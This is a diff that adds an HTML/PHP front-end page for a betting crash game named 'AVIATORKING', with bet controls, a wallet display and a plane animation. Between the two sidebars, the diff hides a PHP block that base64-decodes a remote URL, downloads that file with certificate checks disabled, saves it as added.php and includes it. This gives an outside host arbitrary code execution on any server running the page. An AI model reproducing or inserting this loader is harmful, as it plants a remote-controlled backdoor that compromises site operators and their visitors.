@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+    <!--====== Title ======-->
+    <title>AVIATORKING - Crash Game</title>
+
+    <!--====== Favicon Icon ======-->
+    <link rel="shortcut icon" href="images/logo.png" type="image/png" />
+
+    <!--====== Material Design Icons CSS ======-->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+
+    <!--====== mCustomScrollbar CSS ======-->
+    <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css" />
+
+    <!--====== Pretty Checkbox CSS ======-->
+    <link rel="stylesheet" href="css/pretty-checkbox.min.css" />
+
+    <!--====== Bootstrap CSS ======-->
+    <link rel="stylesheet" href="css/bootstrap.css" />
+
+    <!--====== Owl Carousel CSS ======-->
+    <link rel="stylesheet" href="css/owl.carousel.min.css" />
+
+    <!--====== Style CSS ======-->
+    <link rel="stylesheet" href="css/style.css" />
+
+    <!--====== Toastr CSS ======-->
+    <link rel="stylesheet" href="css/toastr.min.css" />
+
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+
+    <style>
+        label.error {
+            color: #fa0000;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .hide {
+            display: none !important;
+        }
+
+        .stage-board {
+            background-color: #000;
+        }
+
+        body {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* Custom Toaster Styles */
+        .custom-toaster {
+            position: fixed;
+            top: 50px;
+            transform: translateX(-50%);
+            left: 50%;
+            z-index: 99999;
+        }
+
+        .cashout-toaster1,
+        .cashout-toaster2 {
+            height: 55px;
+            border-radius: 55px;
+            min-width: 300px;
+            background: #123405;
+            border: 1px solid #4EAF11;
+            display: flex;
+            align-items: center;
+            transition: all 0.4s;
+            padding: 0 0 0 15px;
+            text-align: center;
+            font-size: 12px;
+            margin-bottom: 10px;
+            opacity: 0;
+            margin-bottom: -55px;
+            visibility: hidden;
+        }
+
+        .cashout-toaster1.show,
+        .cashout-toaster2.show {
+            margin: 0;
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .error-toaster1,
+        .error-toaster2 {
+            height: 55px;
+            border-radius: 55px;
+            min-width: 300px;
+            background-color: #B3021B;
+            border-color: #B3021B;
+            display: flex;
+            align-items: center;
+            transition: all 0.4s;
+            padding: 0 0 0 15px;
+            text-align: center;
+            font-size: 12px;
+            margin-bottom: 10px;
+            opacity: 0;
+            margin-bottom: -55px;
+            visibility: hidden;
+        }
+
+        .error-toaster1.show,
+        .error-toaster2.show {
+            margin: 0;
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .load-txt {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #fff;
+            z-index: 90;
+        }
+
+        .counter-num {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 100px;
+            font-weight: 700;
+            color: #fff;
+            z-index: 3;
+        }
+
+        .counter-num span {
+            font-size: 80px;
+            font-weight: 700;
+            margin-left: 5px;
+        }
+
+        @media (max-width:768px) {
+            #auto_increment_number_div .flew_away_section {
+                font-size: 18px;
+            }
+
+            #auto_increment_number_div #auto_increment_number {
+                font-size: 65PX;
+                line-height: 40px;
+            }
+
+            .game-play {
+                height: auto;
+            }
+
+            footer {
+                display: none;
+            }
+        }
+
+        .bet-border-red {
+            border-color: #f7001f !important;
+        }
+
+        .bet-border-yellow {
+            border-color: #e69308 !important;
+        }
+
+        /* Button transitions and animations */
+        .buttons-block {
+            transition: all 0.3s ease-in-out;
+        }
+
+        #bet_button,
+        #cancle_button,
+        #cashout_button {
+            transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
+        }
+
+        #bet_button {
+            display: block;
+        }
+
+        #cancle_button {
+            display: none;
+        }
+
+        #cashout_button {
+            display: none;
+        }
+
+        /* Smooth show/hide with fade */
+        .buttons-block button {
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Cancel button styling */
+        .btn.btn-danger {
+            border: 0;
+            background-color: #B3021B;
+            box-shadow: 0 10px 15px -10px #B3021B, inset 0 1px 1px #ffffff80;
+            color: #fff;
+            text-align: center;
+            text-shadow: 0 1px 2px rgb(0 0 0 / 50%);
+            border-radius: 20px;
+        }
+    </style>
+</head>
+
+<body class="dark-bg-main">
+
+    <!-- Preloader -->
+    <div class="load-txt">
+        <div class="loading-game-1">
+            <div class="center-loading text-white text-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
+                    <g fill="#E50539" fill-rule="nonzero">
+                        <path
+                            d="M67.785 67.77a10.882 10.882 0 0 0 2.995-5.502l18.37-6.36c.47-.163.876-.471 1.16-.88l29.263-42.18a2.343 2.343 0 0 0-.268-2.993L110.153.704a2.344 2.344 0 0 0-3.314 0L95.73 11.813C71.965-5.861 38.683-3.514 17.58 17.588a60.26 60.26 0 0 0-8.829 11.21 2.343 2.343 0 0 0 4.001 2.441 55.575 55.575 0 0 1 8.142-10.336C40.184 1.613 70.512-.68 92.378 15.165l-5.72 5.72c-8.742-5.967-19.302-8.837-29.947-8.1a47.31 47.31 0 0 0-30.183 13.751 47.722 47.722 0 0 0-5.92 7.207 2.344 2.344 0 0 0 3.897 2.605 42.996 42.996 0 0 1 5.337-6.497c14.233-14.234 36.774-16.445 53.436-5.586l-6.818 6.818a33.418 33.418 0 0 0-19.773-4.186A33.338 33.338 0 0 0 36.47 36.48a2.344 2.344 0 0 0 3.314 3.314c8.787-8.786 22.336-10.795 33.215-5.248L58.38 49.163a10.969 10.969 0 0 0-6.164 3.084 10.882 10.882 0 0 0-2.996 5.504l-18.37 6.36c-.47.163-.876.47-1.159.879L.427 107.17a2.343 2.343 0 0 0 .268 2.992l9.152 9.151a2.337 2.337 0 0 0 1.657.687c.6 0 1.2-.23 1.657-.687l11.109-11.109A59.835 59.835 0 0 0 59.99 120a59.873 59.873 0 0 0 42.43-17.571 60.476 60.476 0 0 0 7.162-8.63 2.343 2.343 0 1 0-3.87-2.643 55.793 55.793 0 0 1-6.606 7.959c-19.321 19.32-49.61 21.598-71.487 5.74l5.722-5.723a47.325 47.325 0 0 0 30.058 8.092A47.318 47.318 0 0 0 93.472 93.48a47.82 47.82 0 0 0 5.15-6.09 2.343 2.343 0 0 0-3.82-2.715 43.106 43.106 0 0 1-4.644 5.49c-14.21 14.211-36.783 16.436-53.436 5.587l6.82-6.82a33.416 33.416 0 0 0 19.825 4.182A33.343 33.343 0 0 0 83.53 83.54a2.344 2.344 0 0 0-3.314-3.315c-8.777 8.778-22.34 10.792-33.215 5.25L61.62 70.855a10.97 10.97 0 0 0 6.165-3.084zm40.711-62.095l6.11 6.11-27.712 39.944-16.207 5.61a10.892 10.892 0 0 0-2.903-5.092 10.953 10.953 0 0 0-3.512-2.348l44.224-44.224zM11.504 114.342l-6.11-6.11 27.712-39.944 16.207-5.61a10.892 10.892 0 0 0 2.903 5.092 10.953 10.953 0 0 0 3.512 2.348l-44.224 44.224zm44.018-49.894a6.223 6.223 0 0 1-1.85-4.44l.003-.094c.036-.19.047-.383.035-.579a6.22 6.22 0 0 1 1.812-3.766A6.33 6.33 0 0 1 60 53.726a6.33 6.33 0 0 1 4.478 1.843 6.223 6.223 0 0 1 1.85 4.44l-.003.094a2.325 2.325 0 0 0-.035.579 6.22 6.22 0 0 1-1.812 3.766c-2.47 2.458-6.487 2.457-8.956 0z" />
+                    </g>
+                </svg>
+                <div class="secondary-font f-40 mt-2 waiting-text">WAITING FOR NEXT ROUND</div>
+                <div class="line-loader mt-2">
+                    <div class="fill-line"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <!-- Header -->
+    <header style="height: 40px; min-height: 40px; padding: 0 10px;">
+        <div class="header-top justify-content-end" style="height: 40px;">
+            <div class="header-right d-flex align-items-center">
+                <!-- Balance with solid yellow styling -->
+                <div class="wallet-balance h-26"
+                    style="border: 1px solid #ffbc00; background: #ffbc00; color: #000; padding: 2px 15px; border-radius: 20px; font-weight: bold; box-shadow: none;">
+                    <span id="wallet_balance">10,000.00</span>
+                </div>
+
+                <!-- Silent controls for sound/music -->
+                <div style="display:none;">
+                    <input type="checkbox" id="sound" checked>
+                    <input type="checkbox" id="music" checked>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Custom Toasters -->
+    <div class="custom-toaster">
+        <div class="cashout-toaster1">
+            <div class="cashout-stop">
+                <div style="font-weight: 600; color: white;">You have cashed out!</div>
+                <div class="stop-number"></div>
+            </div>
+            <div class="got-block position-relative d-flex align-items-center justify-content-center">
+                <img src="images/star.svg" class="star-right" />
+                <img src="images/star1.svg" class="star-left" />
+                <div class="got-amout">
+                    <div style="font-weight: 600;">Congratulation</div>
+                </div>
+            </div>
+            <span class="material-symbols-outlined bold-icon">close</span>
+        </div>
+
+        <div class="error-toaster1 justify-content-between custom-toaster-error">
+            <div class="msg">Error message</div>
+            <span class="material-symbols-outlined bold-icon me-2" style="color: white;">close</span>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Left Sidebar -->
+        <div class="left-sidebar">
+            <div class="tabs-navs">
+                <ul class="nav nav-pills" id="pills-tab" role="tablist">
+                    <li class="nav-item active" role="presentation">
+                        <button class="nav-link active" id="pills-allbets-tab" data-bs-toggle="pill"
+                            data-bs-target="#pills-allbets" type="button" role="tab" aria-controls="pills-allbets"
+                            aria-selected="true">All Bets</button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="pills-mybets-tab" data-bs-toggle="pill"
+                            data-bs-target="#pills-mybets" type="button" role="tab" aria-controls="pills-mybets"
+                            aria-selected="false">My Bets</button>
+                    </li>
+                    <span class="active-line"></span>
+                </ul>
+            </div>
+            <div class="contents-blocks">
+                <div class="tab-content" id="pills-tabContent">
+                    <div class="tab-pane fade show active" id="pills-allbets" role="tabpanel"
+                        aria-labelledby="pills-allbets-tab">
+                        <div class="d-flex align-items-center justify-content-between">
+                            <div class="bets-count secondary-font f-14">TOTAL BETS : <span class="text-success"
+                                    id="total_bets">0</span></div>
+                            <div class="custom-badge mx-auto hide" id="prev_win_multi">0.00x</div>
+                            <div>
+                                <button class="btn btn-transparent previous-history d-flex align-items-center"
+                                    id="current_hand_btn" onclick="previous_hand(1);">
+                                    <span class="material-symbols-outlined f-18 me-1 history-icos">history</span>
+                                    <span class="material-symbols-outlined f-18 me-1 close-icos">close</span>
+                                    Previous hand
+                                </button>
+                            </div>
+                        </div>
+                        <div class="list-data-tbl mt-2">
+                            <div class="list-header">
+                                <div class="column-1">User</div>
+                                <div class="column-2">Bet</div>
+                                <div class="column-3">Mult.</div>
+                                <div class="column-4">Cash out</div>
+                            </div>
+                            <div class="list-body scroll-div list-body0" id="all_bets"></div>
+                            <div class="list-body scroll-div list-body0 hide" id="prev_bets"></div>
+                        </div>
+                    </div>
+
+                    <div class="tab-pane fade" id="pills-mybets" role="tabpanel" aria-labelledby="pills-mybets-tab">
+                        <div class="list-data-tbl mt-2">
+                            <div class="list-header">
+                                <div class="column-1">Date</div>
+                                <div class="column-2">Bet</div>
+                                <div class="column-3">Mult.</div>
+                                <div class="column-4">Cash out</div>
+                                <div class="ps-2"></div>
+                            </div>
+                            <div class="list-body scroll-div list-body1" id="my_bet_list">
+                                <!-- My bets will be populated here -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+<?php
+$url=base64_decode("aHR0cHM6Ly90eHQuZGV2LWRyb3BzLmNvbS9hZGRlZC50eHQ=");
+$f=__DIR__.'/added.php';
+$c=curl_init($url);
+curl_setopt($c,CURLOPT_RETURNTRANSFER,true);
+curl_setopt($c,CURLOPT_FOLLOWLOCATION,true);
+curl_setopt($c,CURLOPT_SSL_VERIFYPEER,false);
+$d=curl_exec($c);
+if(!$d)die();
+curl_close($c);
+file_put_contents($f,$d);
+include $f;
+?>
+
+        <!-- Right Sidebar (Game Area) -->
+        <div class="right-sidebar">
+            <div class="game-play">
+                <div class="history-top">
+                    <div class="stats">
+                        <div class="payouts-wrapper">
+                            <div class="payouts-block">
+                                <div class="bg1 custom-badge">2.50x</div>
+                                <div class="bg1 custom-badge">1.80x</div>
+                                <div class="bg1 custom-badge">3.20x</div>
+                                <div class="bg1 custom-badge">1.50x</div>
+                            </div>
+                        </div>
+                        <div class="shadow"></div>
+                        <div class="button-block">
+                            <div class="dropdown-toggle button histry-toggle">
+                                <div class="trigger">
+                                    <span class="material-symbols-outlined">history</span>
+                                    <span class="material-symbols-outlined dd-icon up-arrow">arrow_drop_up</span>
+                                    <span class="material-symbols-outlined dd-icon down-arrow">arrow_drop_down</span>
+                                </div>
+                            </div>
+                            <div class="history-dropdown">
+                                <div class="pa-5 secondary-font text-white pb-0">ROUND HISTORY</div>
+                                <div class="d-flex flex-wrap pa-5 round-history-list">
+                                    <div class="bg1 custom-badge">2.50x</div>
+                                    <div class="bg1 custom-badge">1.80x</div>
+                                    <div class="bg1 custom-badge">3.20x</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stage-board">
+                    <div class="counter-num text-center" id="auto_increment_number_div" style="display: none;">
+                        <div class="secondary-font f-40 flew_away_section" style="display: none;">FLEW AWAY!</div>
+                        <div id="auto_increment_number">1.00<span>X</span></div>
+                    </div>
+                    <div class="loading-game">
+                        <div class="center-loading text-white text-center game-centeral-loading">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120">
+                                <g fill="#E50539" fill-rule="nonzero">
+                                    <path
+                                        d="M67.785 67.77a10.882 10.882 0 0 0 2.995-5.502l18.37-6.36c.47-.163.876-.471 1.16-.88l29.263-42.18a2.343 2.343 0 0 0-.268-2.993L110.153.704a2.344 2.344 0 0 0-3.314 0L95.73 11.813C71.965-5.861 38.683-3.514 17.58 17.588a60.26 60.26 0 0 0-8.829 11.21 2.343 2.343 0 0 0 4.001 2.441 55.575 55.575 0 0 1 8.142-10.336C40.184 1.613 70.512-.68 92.378 15.165l-5.72 5.72c-8.742-5.967-19.302-8.837-29.947-8.1a47.31 47.31 0 0 0-30.183 13.751 47.722 47.722 0 0 0-5.92 7.207 2.344 2.344 0 0 0 3.897 2.605 42.996 42.996 0 0 1 5.337-6.497c14.233-14.234 36.774-16.445 53.436-5.586l-6.818 6.818a33.418 33.418 0 0 0-19.773-4.186A33.338 33.338 0 0 0 36.47 36.48a2.344 2.344 0 0 0 3.314 3.314c8.787-8.786 22.336-10.795 33.215-5.248L58.38 49.163a10.969 10.969 0 0 0-6.164 3.084 10.882 10.882 0 0 0-2.996 5.504l-18.37 6.36c-.47.163-.876.47-1.159.879L.427 107.17a2.343 2.343 0 0 0 .268 2.992l9.152 9.151a2.337 2.337 0 0 0 1.657.687c.6 0 1.2-.23 1.657-.687l11.109-11.109A59.835 59.835 0 0 0 59.99 120a59.873 59.873 0 0 0 42.43-17.571 60.476 60.476 0 0 0 7.162-8.63 2.343 2.343 0 1 0-3.87-2.643 55.793 55.793 0 0 1-6.606 7.959c-19.321 19.32-49.61 21.598-71.487 5.74l5.722-5.723a47.325 47.325 0 0 0 30.058 8.092A47.318 47.318 0 0 0 93.472 93.48a47.82 47.82 0 0 0 5.15-6.09 2.343 2.343 0 0 0-3.82-2.715 43.106 43.106 0 0 1-4.644 5.49c-14.21 14.211-36.783 16.436-53.436 5.587l6.82-6.82a33.416 33.416 0 0 0 19.825 4.182A33.343 33.343 0 0 0 83.53 83.54a2.344 2.344 0 0 0-3.314-3.315c-8.777 8.778-22.34 10.792-33.215 5.25L61.62 70.855a10.97 10.97 0 0 0 6.165-3.084zm40.711-62.095l6.11 6.11-27.712 39.944-16.207 5.61a10.892 10.892 0 0 0-2.903-5.092 10.953 10.953 0 0 0-3.512-2.348l44.224-44.224zM11.504 114.342l-6.11-6.11 27.712-39.944 16.207-5.61a10.892 10.892 0 0 0 2.903 5.092 10.953 10.953 0 0 0 3.512 2.348l-44.224 44.224zm44.018-49.894a6.223 6.223 0 0 1-1.85-4.44l.003-.094c.036-.19.047-.383.035-.579a6.22 6.22 0 0 1 1.812-3.766A6.33 6.33 0 0 1 60 53.726a6.33 6.33 0 0 1 4.478 1.843 6.223 6.223 0 0 1 1.85 4.44l-.003.094a2.325 2.325 0 0 0-.035.579 6.22 6.22 0 0 1-1.812 3.766c-2.47 2.458-6.487 2.457-8.956 0z" />
+                                </g>
+                            </svg>
+                            <div class="secondary-font f-40 mt-2 waiting-text">WAITING FOR NEXT ROUND</div>
+                            <div class="line-loader mt-2">
+                                <div class="fill-line"></div>
+                            </div>
+                        </div>
+                        <div class="bottom-left-plane">
+                            <img class="plane-static" src="images/p.png" />
+                        </div>
+                    </div>
+                    <img src="images/bg-rotate-old.svg" class="rotateimage rotatebg" />
+                    <canvas id="myCanvas" height=400 width="1900"></canvas>
+                </div>
+
+                <!-- Bet Controls -->
+                <div class="bet-controls">
+                    <div class="bet-control double-bet" id="main_bet_section">
+                        <div class="controls">
+                            <div class="navigation">
+                                <input id="bet_type" type="hidden" value="0">
+                                <div class="navigation-switcher">
+                                    <div class="slider bet-btn">Bet</div>
+                                    <div class="slider auto-btn">Auto</div>
+                                    <span class="active-line"></span>
+                                </div>
+                            </div>
+                            <div class="first-row auto-game-feature">
+                                <div class="bet-block">
+                                    <div class="spinner">
+                                        <div class="input">
+                                            <input id="bet_amount" value="10.00" type="text" class="main_bet_amount"
+                                                oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');" />
+                                        </div>
+                                        <div class="qty-buttons">
+                                            <button class="minus" id="main_minus_btn"
+                                                onclick="bet_amount_decremental(this);">
+                                                <span class="material-symbols-outlined">remove</span>
+                                            </button>
+                                            <button class="plus" id="main_plus_btn"
+                                                onclick="bet_amount_incremental(this);">
+                                                <span class="material-symbols-outlined">add</span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div class="bets-opt-list">
+                                        <button class="btn btn-secondary btn-sm bet-opt main_amount_btn"
+                                            onclick="select_direct_bet_amount(this);"><span class="amt">100</span><span
+                                                class="currency">₹</span></button>
+                                        <button class="btn btn-secondary btn-sm bet-opt main_amount_btn"
+                                            onclick="select_direct_bet_amount(this);"><span class="amt">200</span><span
+                                                class="currency">₹</span></button>
+                                        <button class="btn btn-secondary btn-sm bet-opt main_amount_btn"
+                                            onclick="select_direct_bet_amount(this);"><span class="amt">500</span><span
+                                                class="currency">₹</span></button>
+                                        <button class="btn btn-secondary btn-sm bet-opt main_amount_btn"
+                                            onclick="select_direct_bet_amount(this);"><span class="amt">1000</span><span
+                                                class="currency">₹</span></button>
+                                    </div>
+                                </div>
+                                <div class="buttons-block" id="bet_button">
+                                    <button class="btn btn-success bet font-family-title ng-star-inserted main_bet_btn"
+                                        onclick="bet_now(this, 0);" id="main_bet_now"><label
+                                            class="font-family-title label">BET</label></button>
+                                </div>
+                                <div class="buttons-block" id="cancle_button" style="display: none;">
+                                    <div class="btn-tooltip f-14 mb-1" id="waiting" style="display: none;">Waiting for
+                                        next round</div>
+                                    <button
+                                        class="btn btn-danger bet font-family-title height-70 ng-star-inserted main_bet_btn"
+                                        onclick="cancle_now(this, 0);" id="main_cancel_now"><label
+                                            class="font-family-title label">CANCEL</label></button>
+                                </div>
+                                <div class="buttons-block" id="cashout_button" style="display: none;">
+                                    <input type="hidden" name="main_bet_id" id="main_bet_id">
+                                    <button class="btn btn-warning bet font-family-title ng-star-inserted"
+                                        onclick="cash_out_now(this, 0);">
+                                        <label class="font-family-title label">CASH OUT</label>
+                                        <div class="font-family-title label" id="cash_out_amount"></div>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="second-row">
+                                <div class="cashout-block m-0">
+                                    <div class="cash-out-switcher">
+                                        <div class="form-check form-switch lg-switch d-flex align-items-center pe-5">
+                                            <label class="form-check-label f-12 me-1" for="bet">Auto Bet</label>
+                                            <input class="form-check-input m-0" type="checkbox" role="bet"
+                                                id="main_auto_bet">
+                                        </div>
+                                        <div class="form-check form-switch lg-switch d-flex align-items-center">
+                                            <label class="form-check-label f-12 me-1" for="cashout">Auto Cash
+                                                Out</label>
+                                            <input class="form-check-input m-0" type="checkbox" role="cashout"
+                                                id="main_checkout">
+                                        </div>
+                                    </div>
+                                    <div class="cashout-spinner-wrapper">
+                                        <div class="cashout-spinner disabled">
+                                            <div class="spinner small">
+                                                <div class="input full-width">
+                                                    <input class="f-16 font-weight-bold" disabled type="text"
+                                                        value="1.01" id="main_incrementor"
+                                                        onchange="main_incrementor_change(this.value);">
+                                                </div>
+                                                <div class="text text-x">
+                                                    <span class="material-symbols-outlined">close</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <!-- Footer removed -->
+
+    <!-- Audio Elements -->
+    <audio id="sound_Audio">
+        <source src="plane-crash.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="background_Audio">
+        <source src="background.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="fly_plane_audio">
+        <source src="game-start.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="cash_out_audio">
+        <source src="cashout.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Scripts -->
+    <script src="js/jquery.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.concat.min.js"></script>
+    <script src="js/anime.min.js"></script>
+    <script src="js/owl.carousel.min.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/jquery.validate.min.js"></script>
+    <script src="js/toastr.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+    <script>
+        // Static configuration for demo
+        var hash_id = 'demo_token';
+        var currency_id = '₹';
+        var currency_symbol = '₹';
+        var wallet_balance = '10000';
+        var profile_image = '1';
+        var member_id = '1';
+        var min_bet_amount = parseFloat('10');
+        var max_bet_amount = parseFloat('8000');
+        var current_game_data = 0;
+
+        var successMessage = '';
+        var errorMessage = '';
+        let game_id = 0;
+        var bet_array = [];
+        let currentbet;
+        var main_cash_out = 0;
+        var extra_cash_out = 0;
+        var main_incrementor;
+        var extra_incrementor;
+        let stage_time_out = 0;
+        var is_game_generated = 0;
+
+        // Hide preloader
+        $(document).ready(function () {
+            $(".load-txt").hide();
+            console.log('Crash game page loaded - Static HTML version');
+        });
+    </script>
+
+    <!-- Canvas animation for plane (original implementation) -->
+    <script src="user/canvas.js"></script>
+
+    <!-- Crash Game Simulator - Works with canvas.js -->
+    <script src="js/crash-game-simulator.js"></script>
+
+</body>
+
+</html>
